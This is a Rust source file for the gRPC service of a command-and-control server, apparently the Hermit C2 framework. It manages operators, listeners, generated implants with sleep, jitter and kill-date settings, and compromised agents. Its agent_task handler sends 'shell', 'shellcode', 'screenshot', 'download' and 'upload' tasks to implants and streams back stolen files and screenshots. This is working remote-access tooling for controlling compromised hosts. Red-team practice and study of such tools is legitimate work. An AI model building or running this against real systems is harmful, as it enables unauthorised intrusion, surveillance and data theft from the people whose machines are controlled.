// References:
//  - https://github.com/hyperium/tonic/blob/master/examples/routeguide-tutorial.md

use log::{error, info};
use std::{
    fs,
    io::{Error, ErrorKind},
    sync::Arc,
    time::Duration,
};
use tokio::sync::{mpsc, Mutex};
use tokio_stream::wrappers::ReceiverStream;
use tonic::{Request, Response, Status};

use crate::utils::{
    datetime::get_datetime,
    fs::{empty_file, read_file, write_file},
};
use super::{
    db,
    agents::{format_agent_details, format_all_agents},
    implants::{
        generate::generate,
        implant::{format_all_implants, format_implant_details, Implant},
    },
    jobs::{
        find_job,
        format_all_listeners,
        format_listener_details,
        JobMessage
    },
    operators::{
        format_all_operators,
        format_operator_details,
        Operator
    },
    server::HermitServer,
};

pub mod pb_agenttasks {
    tonic::include_proto!("pb_agenttasks");
}
pub mod pb_common {
    tonic::include_proto!("pb_common");
}
pub mod pb_operations {
    tonic::include_proto!("pb_operations");
}
pub mod pb_hermitrpc {
    tonic::include_proto!("pb_hermitrpc"); // Specify the package name of the proto buffer definition.
}

use pb_agenttasks::Task;
use pb_common::{Empty, Result as RpcResult};
use pb_operations::{NewImplant, NewListener, NewOperator, Target};
use pb_hermitrpc::hermit_rpc_server::HermitRpc;

#[derive(Debug)]
pub struct HermitRpcService {
    pub server: Arc<Mutex<HermitServer>>,
}

impl HermitRpcService {
    pub fn new(server: Arc<Mutex<HermitServer>>) -> Self {
        Self {
            server,
        }
    }
}

#[tonic::async_trait]
impl HermitRpc for HermitRpcService {
    async fn add_operator(&self, request: Request<NewOperator>) -> Result<Response<RpcResult>, Status> {
        info!("'add_operator' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let operator_addr = request.remote_addr().unwrap().to_string();
        let operator_name = request.into_inner().name;
        let operator = Operator::new(
            0, // Temporary ID
            operator_name,
            operator_addr,
        );
     
        let result = db::add_operator(server_lock.db.path.to_string(), operator);
        match result {
            Ok(_) => {
                info!("New operator added.");
            },
            Err(e) => {
                error!("Could not add new operator: {:?}", e);
            }
        }

        let result = RpcResult {
            success: true,
            message: "The operator added.".to_string(),
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn info_operator(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'info_operator' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;
        let operator = match db::get_operator(server_lock.db.path.to_string(), target.to_string()) {
            Ok(o) => o,
            Err(e) => {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        };
        let output = format_operator_details(operator);
        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn list_operators(&self, request: Request<Empty>) -> Result<Response<RpcResult>, Status> {
        info!("'list_operators' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let mut operators = match db::get_all_operators(server_lock.db.path.to_string()) {
            Ok(o) => o,
            Err(e) => {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        };
        let output = format_all_operators(&mut operators);
        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn add_listener(&self, request: Request<NewListener>) -> Result<Response<RpcResult>, Status> {
        info!("'add_listener' requested from {:?}", request.remote_addr().unwrap());

        let mut server_lock = self.server.lock().await;

        let new_listener = request.into_inner();

        if let Err(e) = server_lock.add_listener(
            new_listener.name,
            new_listener.domains.split(",").map(|s| s.to_string()).collect(),
            new_listener.protocol,
            new_listener.host,
            new_listener.port.parse().unwrap(),
            false, // init = false
        ).await {
            let result = RpcResult {
                success: false,
                message: e.to_string(),
                data: Vec::new(),
            };
            return Ok(Response::new(result));
        }

        let result = RpcResult {
            success: true,
            message: "Listener added successfully.".to_string(),
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn delete_listener(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'delete_listener' requested from {:?}", request.remote_addr().unwrap());

        let mut server_lock = self.server.lock().await;

        let target_listener = request.into_inner().id_or_name;
        if target_listener.as_str() == "all" {
            // Delete all listeners
            if let Err(e) = server_lock.delete_all_listeners().await {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        } else {
            // Delete a listener
            if let Err(e) = server_lock.delete_listener(target_listener).await {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        }

        let result = RpcResult {
            success: true,
            message: "Listener deleted successfully.".to_string(),
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn start_listener(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'start_listener' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;

        let mut jobs = server_lock.jobs.lock().await;
        let job = match find_job(&mut jobs, target.to_owned()).await {
            Some(j) => j,
            None => {
                let result = RpcResult {
                    success: false,
                    message: "Listener not found.".to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        };

        let mut result = RpcResult {
            success: true,
            message: String::new(),
            data: Vec::new(),
        };

        if !job.running {
            let _ = server_lock.tx_job.lock().await.send(JobMessage::Start(job.id));
            job.running = true;
            result.message = "Listener started.".to_string();
        } else {
            result.message = "Listener has already started.".to_string();
        };

        Ok(Response::new(result))
    }

    async fn stop_listener(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'stop_listener' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;

        let mut jobs = server_lock.jobs.lock().await;
        let job = match find_job(&mut jobs, target.to_owned()).await {
            Some(j) => j,
            None => {
                let result = RpcResult {
                    success: false,
                    message: "Listener not found.".to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        };

        let mut result = RpcResult {
            success: true,
            message: String::new(),
            data: Vec::new(),
        };

        if job.running {
            let _ = server_lock.tx_job.lock().await.send(JobMessage::Stop(job.id));
            job.running = false;
            result.message = "Listener stopped.".to_string();
        } else {
            result.message = "Listener is not running.".to_string();
        }

        Ok(Response::new(result))
    }

    async fn info_listener(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'info_listener' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;

        let mut jobs = server_lock.jobs.lock().await;
        let job = match find_job(&mut jobs, target.to_owned()).await {
            Some(j) => j,
            None => {
                let result = RpcResult {
                    success: false,
                    message: "Listener not found.".to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        };

        let output = format_listener_details(job);

        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn list_listeners(&self, request: Request<Empty>) -> Result<Response<RpcResult>, Status> {
        info!("'list_listeners' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;
        let jobs_lock = server_lock.jobs.lock().await;

        let output = format_all_listeners(&jobs_lock);

        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn use_agent(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'use_agent' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;
        let agent = match db::get_agent(
            server_lock.db.path.to_string(),
            target.to_string()
        ) {
            Ok(ag) => ag,
            Err(e) => {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };

                return Ok(Response::new(result));
            }
        };

        let result = RpcResult {
            success: true,
            message: format!("{},{}", agent.name, agent.os),
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn delete_agent(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'delete_agent' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let mut result = RpcResult {
            success: true,
            message: String::new(),
            data: Vec::new(),
        };

        let target = request.into_inner().id_or_name;
        if target.as_str() == "all" {
            // Delete all agents
            match db::delete_all_agents(server_lock.db.path.to_string()) {
                Ok(_) => {
                    result.message = "Delete all agents successfully".to_string();
                }
                Err(e) => {
                    result.success = false;
                    result.message = e.to_string();
                }
            }
        } else {
            // Check if the agent exists in database.
            match db::get_agent(
                server_lock.db.path.to_string(),
                target.to_string()
            ) {
                Ok(_) => {}
                Err(_) => {
                    result.success = false;
                    result.message = "Agent not found.".to_string();
                    return Ok(Response::new(result));
                }
            };

            match db::delete_agent(
                server_lock.db.path.to_string(),
                target.to_string()
            ) {
                Ok(_) => {
                    result.message = "Agent deleted successfully.".to_string();
                }
                Err(e) => {
                    result.success = false;
                    result.message = e.to_string();
                }
            }
        }

        Ok(Response::new(result))
    }

    async fn info_agent(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'info_agent' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;
        let agent = match db::get_agent(
            server_lock.db.path.to_string(),
            target.to_string()
        ) {
            Ok(ag) => ag,
            Err(e) => {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };

                return Ok(Response::new(result));
            }
        };

        let output = format_agent_details(agent);

        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn list_agents(&self, request: Request<Empty>) -> Result<Response<RpcResult>, Status> {
        info!("'list_agents' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let mut agents = db::get_all_agents(server_lock.db.path.to_string()).unwrap();
        let output = format_all_agents(&mut agents);

        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    type GenerateImplantStream = ReceiverStream<Result<RpcResult, Status>>;

    async fn generate_implant(
        &self,
        request: Request<NewImplant>
    ) -> Result<Response<Self::GenerateImplantStream>, Status> {
        info!("'generate_implant' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let new_implant = request.into_inner();

        let implant = Implant::new(
            0, // Temporary ID
            new_implant.name.to_string(),
            new_implant.url.to_string(),
            new_implant.os.to_string(),
            new_implant.arch.to_string(),
            new_implant.format.to_string(),
            new_implant.sleep as u64,
            new_implant.jitter as u64,
            new_implant.user_agent.to_string(),
            new_implant.killdate.to_string(),
        );

        // Check duplicate
        let exists = db::exists_implant(
            server_lock.db.path.to_string(),
            implant.clone()
        ).unwrap();
        if exists {
            return Err(Status::aborted(
                "Similar implant already exists. Please use it with `implant download` command."));
        }

        // Generate an implant
        match generate(
            server_lock.db.path.to_string(),
            implant.name.to_string(),
            implant.url.to_string(),
            implant.os.to_string(),
            implant.arch.to_string(),
            implant.format.to_string(),
            implant.sleep,
            implant.jitter,
            implant.user_agent.to_string(),
            implant.killdate.to_string(),
        ) {
            Ok((outfile, buffer)) => {
                let (tx, rx) = mpsc::channel(4);

                tokio::spawn(async move {
                    let chunked_buffer = chunk_buffer(buffer).await;
                    for buf in chunked_buffer {
                        let result = RpcResult {
                            success: true,
                            message: outfile.to_string(),
                            data: buf.clone(),
                        };
                        tx.send(Ok(result)).await.unwrap();
                    }
                });

                // Add the new implant to the database (check duplicate again before adding it)
                let exists = db::exists_implant(server_lock.db.path.to_string(), implant.clone()).unwrap();
                if exists {
                    return Err(Status::aborted(
                        "Similar implant already exists. Please use it with `implant download` command."));
                }
                match db::add_implant(server_lock.db.path.to_string(), implant.clone()) {
                    Ok(_) => {
                        info!("New implant added to the database.");
                    }
                    Err(e) => {
                        return Err(Status::aborted(e.to_string()));
                    }
                }

                // Delete output file because the folder is not used in the C2 server side.
                

                return Ok(Response::new(ReceiverStream::new(rx)));    
            },
            Err(_) => {
                return Err(Status::aborted("Implant cannot be generated."));
            }
        }
    }

    type DownloadImplantStream = ReceiverStream<Result<RpcResult, Status>>;

    async fn download_implant(
        &self,
        request: Request<Target>
    ) -> Result<Response<Self::DownloadImplantStream>, Status> {
        info!("'download_implant' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;
        // Get the implant
        let implants = db::get_all_implants(server_lock.db.path.to_string()).unwrap();
        let mut target_implant: Option<Implant> = None;
        for implant in implants {
            if implant.id.to_string() == target || implant.name == target {
                target_implant = Some(implant.to_owned());
                break;
            }
        }

        if let Some(imp) = target_implant {
            match generate(
                server_lock.db.path.to_string(),
                imp.name,
                imp.url,
                imp.os,
                imp.arch,
                imp.format,
                imp.sleep,
                imp.jitter,
                imp.user_agent,
                imp.killdate,
            ) {
                Ok((outfile, buffer)) => {
                    let (tx, rx) = mpsc::channel(4);

                    tokio::spawn(async move {
                        let chunked_buffer = chunk_buffer(buffer).await;
                        for buf in chunked_buffer {
                            let result = RpcResult {
                                success: true,
                                message: outfile.to_string(),
                                data: buf.clone(),
                            };
                            tx.send(Ok(result)).await.unwrap();
                        }
                    });

                    return Ok(Response::new(ReceiverStream::new(rx)));
                },
                Err(_) => {
                    return Err(Status::aborted("Implant cannot be generated."));
                }
            }
        } else {
            return Err(Status::aborted("Implant not found."));
        }
    }

    async fn delete_implant(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'delete_implant' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let target = request.into_inner().id_or_name;

        let mut result = RpcResult {
            success: true,
            message: String::new(),
            data: Vec::new(),
        };

        if target.as_str() == "all" {
            match db::delete_all_implants(server_lock.db.path.to_string()) {
                Ok(_) => {
                    result.message = "All implants deleted successfully.".to_string();
                }
                Err(_) => {
                    result.message = "Implants cannot be deleted.".to_string();
                }
            }
        } else {
            match db::delete_implant(server_lock.db.path.to_string(), target.to_string()) {
                Ok(_) => {
                    result.message = "Implant deleleted successfully.".to_string();
                }
                Err(_) => {
                    result.message = "Implant cannot be deleted.".to_string();
                }
            }
        }

        Ok(Response::new(result))
    }

    async fn info_implant(&self, request: Request<Target>) -> Result<Response<RpcResult>, Status> {
        info!("'info_implant' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;
        let target = request.into_inner().id_or_name;

        let implant = match db::get_implant(server_lock.db.path.to_string(), target.to_string()) {
            Ok(imp) => imp,
            Err(e) => {
                let result = RpcResult {
                    success: false,
                    message: e.to_string(),
                    data: Vec::new(),
                };
                return Ok(Response::new(result));
            }
        };
        let output = format_implant_details(implant);

        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    async fn list_implants(&self, request: Request<Empty>) -> Result<Response<RpcResult>, Status> {
        info!("'list_implants' requested from {:?}", request.remote_addr().unwrap());

        let server_lock = self.server.lock().await;

        let mut implants = db::get_all_implants(server_lock.db.path.to_string()).unwrap();
        let output = format_all_implants(&mut implants);

        let result = RpcResult {
            success: true,
            message: output,
            data: Vec::new(),
        };

        Ok(Response::new(result))
    }

    type AgentTaskStream = ReceiverStream<Result<RpcResult, Status>>;

    async fn agent_task(&self, request: Request<Task>) -> Result<Response<Self::AgentTaskStream>, Status> {
        info!("'agent_task' requested from {:?}", request.remote_addr().unwrap());

        let req_task = request.into_inner();
        let task = req_task.task;
        let agent_name = req_task.agent;
        let args = req_task.args;

        let args = shellwords::split(&args).unwrap();

        let check_sleeptime: Duration = Duration::from_secs(3);
        let max_check_cnt: u8 = 10;

        match task.as_str() {
            "cat" | "cd" | "cp" | "download" | "info" | "ls" | "mkdir" | "net" | "ps" | "pwd" |
            "rm" | "screenshot" | "shell" | "shellcode" | "sleep" | "whoami" => {
                match set_task(agent_name.to_string(), task.to_string(), &args) {
                    Ok(_) => {},
                    Err(e) => {
                        return Err(Status::aborted(e.to_string()));
                    }
                }
    
                return check_task_result(
                    agent_name.to_string(),
                    task.to_string(),
                    check_sleeptime,
                    max_check_cnt,
                ).await;
            }
            "upload" => {
                let file_path = args[0].to_string();
    
                let content = match fs::read(file_path.to_string()) {
                    Ok(c) => c,
                    Err(e) => {
                        return Err(Status::aborted(e.to_string()));
                    }
                };
    
                let file_name = file_path.split("/").last().unwrap();
                match write_file(
                    format!(
                        "agents/{}/uploads/{}",
                        agent_name.to_string(),
                        file_name.to_string()
                    ),
                    &content,
                ) {
                    Ok(_) => {},
                    Err(e) => {
                        return Err(Status::aborted(e.to_string()));
                    }
                }
    
                match set_task(agent_name.to_string(),  task.to_string(), &args) {
                    Ok(_) => {},
                    Err(e) => {
                        return Err(Status::aborted(e.to_string()));
                    }
                }
    
                return check_task_result(
                    agent_name.to_string(),
                    task.to_string(),
                    check_sleeptime,
                    max_check_cnt,
                ).await;
            }
            _ => {
                return Err(Status::aborted("Unknown command."));
            }
        }
    }
}

pub async fn chunk_buffer(buffer: Vec<u8>) -> Vec<Vec<u8>> {
    let mut chunked_buffer: Vec<Vec<u8>> = Vec::new();
    let chunk_size: usize = 1000000;

    let mut current_buffer = buffer;

    loop {
        if current_buffer.len() <= chunk_size {
            chunked_buffer.push(current_buffer.clone());
            break;
        }

        // Split the buffer with chunk
        let (origin_buffer, new_buffer) = current_buffer.split_at_mut(chunk_size);

        chunked_buffer.push(origin_buffer.to_vec());

        current_buffer = new_buffer.to_vec();
    }
    
    chunked_buffer
}

fn set_task(agent_name: String, task: String, args: &Vec<String>) -> Result<(), Error> {
    let cmd = task + " " + args.join(" ").as_str();

    match write_file(
        format!("agents/{}/task/name", agent_name),
        cmd.as_bytes(),
    ) {
        Ok(_) => {
            info!("The task set successfully.");
            return Ok(());
        },
        Err(e) => {
            return Err(Error::new(ErrorKind::Other, e.to_string()));
        },
    }
}

async fn check_task_result(
    agent_name: String,
    task: String,
    sleeptime: Duration,
    max_check_cnt: u8,
) -> Result<Response<<HermitRpcService as HermitRpc>::AgentTaskStream>, Status> {
    let mut cnt: u8 = 0;

    loop {
        tokio::time::sleep(sleeptime).await;

        if let Ok(task_result) = read_file(
            format!("agents/{}/task/result", agent_name.to_string()))
        {
            if task_result.len() > 0 {
                let (tx, rx) = mpsc::channel(4);
                
                if task == "download" {
                    let task_result = task_result.clone();
                    // Extract the filename from the binary
                    let mut filename: Vec<u8> = Vec::new();
                    let mut contents: Vec<u8> = Vec::new();
                    let mut newline_found = false;

                    for r in task_result {
                        info!("r: {:?}", r.to_string());
                        if !newline_found {
                            if r == 10 {
                                newline_found = true;
                            } else {
                                filename.push(r);
                            }
                        } else {
                            contents.push(r);
                        }
                    }
                    let outfile = format!(
                        "agents/{}/downloads/{}",
                        agent_name.to_owned(),
                        String::from_utf8(filename).unwrap(),
                    );

                    tokio::spawn(async move {
                        let chunked_contents = chunk_buffer(contents).await;
                        for chunk in chunked_contents {
                            let result = RpcResult {
                                success: true,
                                message: outfile.to_string(),
                                data: chunk.clone(),
                            };
                            tx.send(Ok(result)).await.unwrap();
                        }
                    });

                    return Ok(Response::new(ReceiverStream::new(rx)));
                }
                else if task == "screenshot" {
                    let outfile = format!(
                        "agents/{}/screenshots/screenshot_{}.png",
                        agent_name.to_owned(),
                        get_datetime(""),
                    );
                    
                    tokio::spawn(async move {
                        let chunked_result = chunk_buffer(task_result).await;
                        for chunk in chunked_result {
                            let result = RpcResult {
                                success: true,
                                message: outfile.to_string(),
                                data: chunk.clone(),
                            };
                            tx.send(Ok(result)).await.unwrap();
                        }
                    });
                } else {
                    // Other task results
                    tokio::spawn(async move {
                        let chunked_result = chunk_buffer(task_result).await;
                        for chunk in chunked_result {
                            let result = RpcResult {
                                success: true,
                                message: String::new(),
                                data: chunk.clone(),
                            };
                            tx.send(Ok(result)).await.unwrap();
                        }
                    });
                }

                // Initialize the task result
                empty_file(format!("agents/{}/task/result", agent_name.to_string())).unwrap();
                return Ok(Response::new(ReceiverStream::new(rx)));
            } else {
                cnt += 1;
                if cnt > max_check_cnt {
                    return Err(Status::aborted("Task result cannot be retrieved."));
                }
            }
        } else {
            error!("Could not read `task/result` file.");
            return Err(Status::aborted("Could not read `task/result` file."));
        }
    }
}